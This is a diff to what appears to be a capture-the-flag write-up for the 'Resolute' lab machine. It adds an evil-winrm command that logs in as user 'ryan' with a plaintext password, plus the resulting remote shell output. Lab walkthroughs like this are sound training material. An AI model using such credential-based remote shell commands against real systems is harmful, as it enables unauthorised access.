@@ -260,6 +260,18 @@ He is also part of remote management users so i can get access over WINRM
 
 ## Shell as `ryan`
 ```python
-
+evil-winrm -i resolute.megabank.local -u ryan -p 'Serv3r4Admin4cc123!'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ryan\Documents>
 ```
+Shell access as `ryan`
+
+
 
